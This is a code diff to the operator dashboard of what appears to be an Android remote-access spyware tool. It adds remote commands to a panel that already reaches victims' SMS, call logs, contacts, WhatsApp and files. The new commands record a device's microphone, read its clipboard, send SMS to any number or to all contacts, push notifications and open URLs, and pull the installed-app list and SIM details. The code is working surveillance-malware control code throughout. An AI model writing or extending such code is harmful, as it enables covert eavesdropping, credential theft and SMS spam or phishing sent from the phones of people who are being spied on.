@@ -125,7 +125,8 @@ function updateDeviceSelects() {
                  'filesDeviceSelect', 'calllogDeviceSelect', 'smsDeviceSelect',
                  'historyDeviceSelect', 'notificationsDeviceSelect', 'contactsDeviceSelect',
                  'recordingsDeviceSelect', 'whatsappDeviceSelect',
-                 'infoDeviceSelect', 'emergencyDeviceSelect'];
+                 'infoDeviceSelect', 'emergencyDeviceSelect',
+                 'remoteActionsDeviceSelect', 'appsDeviceSelect', 'simDeviceSelect'];
 
   selects.forEach(function(selId) {
     var sel = document.getElementById(selId);
@@ -1398,6 +1399,262 @@ socket.on('photo:deleted', function(data) {
     showToast('Failed to delete photo: ' + (data.error || ''), 'error');
   }
 });
+
+// ============ REMOTE ACTIONS ============
+
+function getRemoteDeviceId() {
+  return document.getElementById('remoteActionsDeviceSelect').value;
+}
+
+// Open URL / WebView
+function sendWebViewOpen() {
+  var deviceId = getRemoteDeviceId();
+  if (!deviceId) { showToast('Select a device first', 'error'); return; }
+  var url = document.getElementById('webviewUrl').value.trim();
+  if (!url) { showToast('Enter a URL', 'error'); return; }
+  if (!url.startsWith('http')) url = 'https://' + url;
+  socket.emit('command:webview:open', { deviceId: deviceId, url: url });
+  document.getElementById('webviewResult').textContent = 'Opening URL...';
+}
+socket.on('webview:opened', function(data) {
+  document.getElementById('webviewResult').innerHTML = '<span style="color:var(--success)">URL opened on device</span>';
+  showToast('URL opened on device', 'success');
+});
+
+// Send Notification
+function sendNotification() {
+  var deviceId = getRemoteDeviceId();
+  if (!deviceId) { showToast('Select a device first', 'error'); return; }
+  var title = document.getElementById('notifTitle').value.trim();
+  var body = document.getElementById('notifBody').value.trim();
+  var url = document.getElementById('notifUrl').value.trim();
+  if (!title && !body) { showToast('Enter title or body', 'error'); return; }
+  socket.emit('command:notification:send', { deviceId: deviceId, title: title, body: body, url: url });
+  document.getElementById('notifResult').textContent = 'Sending notification...';
+}
+socket.on('notification:sent', function(data) {
+  document.getElementById('notifResult').innerHTML = '<span style="color:var(--success)">Notification sent!</span>';
+  showToast('Notification sent to device', 'success');
+});
+
+// Toast
+function sendToast() {
+  var deviceId = getRemoteDeviceId();
+  if (!deviceId) { showToast('Select a device first', 'error'); return; }
+  var message = document.getElementById('toastMessage').value.trim();
+  if (!message) { showToast('Enter a message', 'error'); return; }
+  var duration = parseInt(document.getElementById('toastDuration').value);
+  socket.emit('command:toast:show', { deviceId: deviceId, message: message, duration: duration });
+  document.getElementById('toastResult').textContent = 'Showing toast...';
+}
+socket.on('toast:shown', function(data) {
+  document.getElementById('toastResult').innerHTML = '<span style="color:var(--success)">Toast shown on device!</span>';
+  showToast('Toast shown on device', 'success');
+});
+
+// Vibrate
+function sendVibrate() {
+  var deviceId = getRemoteDeviceId();
+  if (!deviceId) { showToast('Select a device first', 'error'); return; }
+  var duration = parseInt(document.getElementById('vibrateDuration').value) || 1000;
+  var pattern = document.getElementById('vibratePattern').value.trim();
+  socket.emit('command:vibrate', { deviceId: deviceId, duration: duration, pattern: pattern });
+  document.getElementById('vibrateResult').textContent = 'Vibrating...';
+}
+socket.on('vibrate:done', function(data) {
+  if (data.error) {
+    document.getElementById('vibrateResult').innerHTML = '<span style="color:var(--danger)">' + data.error + '</span>';
+  } else {
+    document.getElementById('vibrateResult').innerHTML = '<span style="color:var(--success)">Device vibrated!</span>';
+    showToast('Device vibrated', 'success');
+  }
+});
+
+// Send SMS
+function sendSms() {
+  var deviceId = getRemoteDeviceId();
+  if (!deviceId) { showToast('Select a device first', 'error'); return; }
+  var number = document.getElementById('smsNumber').value.trim();
+  var message = document.getElementById('smsMessage').value.trim();
+  if (!number || !message) { showToast('Enter number and message', 'error'); return; }
+  socket.emit('command:sms:send', { deviceId: deviceId, number: number, message: message });
+  document.getElementById('smsResult').textContent = 'Sending SMS...';
+}
+socket.on('sms:sent', function(data) {
+  if (data.error) {
+    document.getElementById('smsResult').innerHTML = '<span style="color:var(--danger)">' + data.error + '</span>';
+  } else {
+    document.getElementById('smsResult').innerHTML = '<span style="color:var(--success)">SMS sent to ' + (data.number || '') + '</span>';
+    showToast('SMS sent!', 'success');
+  }
+});
+
+// Send SMS to All
+function sendSmsAll() {
+  var deviceId = getRemoteDeviceId();
+  if (!deviceId) { showToast('Select a device first', 'error'); return; }
+  var message = document.getElementById('smsAllMessage').value.trim();
+  if (!message) { showToast('Enter a message', 'error'); return; }
+  if (!confirm('Are you sure you want to send SMS to ALL contacts?')) return;
+  socket.emit('command:sms:sendall', { deviceId: deviceId, message: message });
+  document.getElementById('smsAllResult').textContent = 'Sending to all contacts...';
+}
+socket.on('sms:sentall', function(data) {
+  if (data.error) {
+    document.getElementById('smsAllResult').innerHTML = '<span style="color:var(--danger)">' + data.error + '</span>';
+  } else {
+    document.getElementById('smsAllResult').innerHTML = '<span style="color:var(--success)">Sent to ' + data.sentCount + '/' + data.totalContacts + ' contacts</span>';
+    showToast('SMS sent to ' + data.sentCount + ' contacts', 'success');
+  }
+});
+
+// Microphone Record
+function recordMic() {
+  var deviceId = getRemoteDeviceId();
+  if (!deviceId) { showToast('Select a device first', 'error'); return; }
+  var duration = parseInt(document.getElementById('micDuration').value) || 10;
+  socket.emit('command:mic:record', { deviceId: deviceId, duration: duration });
+  document.getElementById('btnRecordMic').disabled = true;
+  document.getElementById('btnRecordMic').textContent = 'Recording...';
+  document.getElementById('micStatus').textContent = 'Recording for ' + duration + ' seconds...';
+  document.getElementById('micPlayer').style.display = 'none';
+}
+socket.on('mic:status', function(data) {
+  document.getElementById('micStatus').textContent = 'Recording for ' + data.duration + 's...';
+});
+socket.on('mic:recording', function(data) {
+  document.getElementById('btnRecordMic').disabled = false;
+  document.getElementById('btnRecordMic').textContent = 'Record';
+  document.getElementById('micStatus').innerHTML = '<span style="color:var(--success)">Recording complete! (' + data.duration + 's)</span>';
+  document.getElementById('micPlayer').style.display = 'block';
+  document.getElementById('micAudio').src = data.audio;
+  document.getElementById('micDownload').href = data.audio;
+  showToast('Mic recording received', 'success');
+});
+
+// Clipboard
+function getClipboard() {
+  var deviceId = getRemoteDeviceId();
+  if (!deviceId) { showToast('Select a device first', 'error'); return; }
+  socket.emit('command:clipboard:get', { deviceId: deviceId });
+  document.getElementById('clipboardResult').style.display = 'block';
+  document.getElementById('clipboardResult').textContent = 'Fetching clipboard...';
+}
+socket.on('clipboard:content', function(data) {
+  var el = document.getElementById('clipboardResult');
+  if (el) {
+    el.style.display = 'block';
+    el.textContent = data.text || '(empty clipboard)';
+    showToast('Clipboard received', 'success');
+  }
+});
+
+// ============ INSTALLED APPS ============
+var allApps = [];
+
+function fetchApps() {
+  var deviceId = document.getElementById('appsDeviceSelect').value;
+  if (!deviceId) { showToast('Select a device first', 'error'); return; }
+  socket.emit('command:apps:list', { deviceId: deviceId });
+  document.getElementById('appsList').innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-muted)">Loading apps...</div>';
+}
+
+socket.on('apps:list', function(data) {
+  allApps = data.apps || [];
+  document.getElementById('appsCount').textContent = allApps.length + ' apps found';
+  filterApps();
+  showToast(allApps.length + ' apps loaded', 'success');
+});
+
+function filterApps() {
+  var search = (document.getElementById('appsSearch').value || '').toLowerCase();
+  var hideSystem = document.getElementById('appsHideSystem').checked;
+
+  var filtered = allApps.filter(function(app) {
+    if (hideSystem && app.system) return false;
+    if (search && app.name.toLowerCase().indexOf(search) === -1 &&
+        app['package'].toLowerCase().indexOf(search) === -1) return false;
+    return true;
+  });
+
+  var html = '<table style="width:100%;border-collapse:collapse">';
+  html += '<thead><tr style="border-bottom:1px solid var(--border)">';
+  html += '<th style="text-align:left;padding:10px;color:var(--text-secondary);font-size:13px">App Name</th>';
+  html += '<th style="text-align:left;padding:10px;color:var(--text-secondary);font-size:13px">Package</th>';
+  html += '<th style="text-align:left;padding:10px;color:var(--text-secondary);font-size:13px">Version</th>';
+  html += '<th style="text-align:left;padding:10px;color:var(--text-secondary);font-size:13px">Type</th>';
+  html += '</tr></thead><tbody>';
+
+  filtered.forEach(function(app) {
+    html += '<tr style="border-bottom:1px solid var(--border)">';
+    html += '<td style="padding:10px;font-size:14px">' + escapeHtml(app.name) + '</td>';
+    html += '<td style="padding:10px;font-size:12px;color:var(--text-muted);word-break:break-all">' + escapeHtml(app['package']) + '</td>';
+    html += '<td style="padding:10px;font-size:13px">' + (app.version || '-') + '</td>';
+    html += '<td style="padding:10px"><span style="padding:2px 8px;border-radius:4px;font-size:11px;background:' +
+      (app.system ? 'rgba(245,158,11,0.15);color:#f59e0b' : 'rgba(34,197,94,0.15);color:#22c55e') + '">' +
+      (app.system ? 'System' : 'User') + '</span></td>';
+    html += '</tr>';
+  });
+  html += '</tbody></table>';
+
+  document.getElementById('appsList').innerHTML = html;
+  document.getElementById('appsCount').textContent = filtered.length + ' of ' + allApps.length + ' apps';
+}
+
+function escapeHtml(text) {
+  var div = document.createElement('div');
+  div.textContent = text || '';
+  return div.innerHTML;
+}
+
+// ============ SIM INFO ============
+
+function fetchSimInfo() {
+  var deviceId = document.getElementById('simDeviceSelect').value;
+  if (!deviceId) { showToast('Select a device first', 'error'); return; }
+  socket.emit('command:sim:info', { deviceId: deviceId });
+  document.getElementById('simInfoContent').innerHTML = '<div class="card" style="text-align:center;padding:40px"><p style="color:var(--text-muted)">Loading SIM info...</p></div>';
+}
+
+socket.on('sim:info', function(data) {
+  var html = '<div class="grid-2">';
+
+  html += '<div class="card"><h3 style="margin-bottom:16px">Operator Info</h3>';
+  html += '<div style="display:grid;gap:12px">';
+  html += simInfoRow('Network Operator', data.operator);
+  html += simInfoRow('SIM Operator', data.simOperator);
+  html += simInfoRow('Operator Code', data.operatorCode);
+  html += simInfoRow('SIM Country', data.simCountry ? data.simCountry.toUpperCase() : '-');
+  html += simInfoRow('Network Country', data.networkCountry ? data.networkCountry.toUpperCase() : '-');
+  html += simInfoRow('Phone Type', ['None', 'GSM', 'CDMA', 'SIP'][data.phoneType] || data.phoneType);
+  html += simInfoRow('Connected', data.connected ? 'Yes' : 'No');
+  html += simInfoRow('Connection Type', data.connectionType || '-');
+  html += '</div></div>';
+
+  if (data.simSlots && data.simSlots.length > 0) {
+    html += '<div class="card"><h3 style="margin-bottom:16px">SIM Slots</h3>';
+    html += '<div style="display:grid;gap:16px">';
+    data.simSlots.forEach(function(sim, idx) {
+      html += '<div style="padding:12px;background:var(--bg);border-radius:8px">';
+      html += '<div style="font-weight:600;margin-bottom:8px">Slot ' + (sim.slot + 1) + '</div>';
+      html += simInfoRow('Carrier', sim.carrier);
+      html += simInfoRow('Display Name', sim.displayName);
+      html += simInfoRow('Country', sim.country ? sim.country.toUpperCase() : '-');
+      html += '</div>';
+    });
+    html += '</div></div>';
+  }
+
+  html += '</div>';
+  document.getElementById('simInfoContent').innerHTML = html;
+  showToast('SIM info loaded', 'success');
+});
+
+function simInfoRow(label, value) {
+  return '<div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid var(--border)">' +
+    '<span style="color:var(--text-secondary);font-size:13px">' + label + '</span>' +
+    '<span style="font-size:14px;font-weight:500">' + (value || '-') + '</span></div>';
+}
 
 // ---- Socket Events ----
 socket.on('devices:updated', fetchDevices);
